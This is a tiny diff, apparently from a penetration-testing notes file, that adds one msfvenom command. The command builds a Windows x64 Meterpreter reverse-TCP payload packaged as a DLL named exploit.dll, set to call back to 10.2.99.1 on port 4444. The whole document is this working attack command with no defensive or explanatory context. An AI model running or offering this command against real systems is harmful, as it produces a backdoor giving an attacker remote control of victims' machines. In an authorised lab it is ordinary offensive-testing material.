@@ -1,0 +1,2 @@
+#Generate a DLL file with msfvenom 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.2.99.1 LPORT=4444 -f dll -o exploit.dll
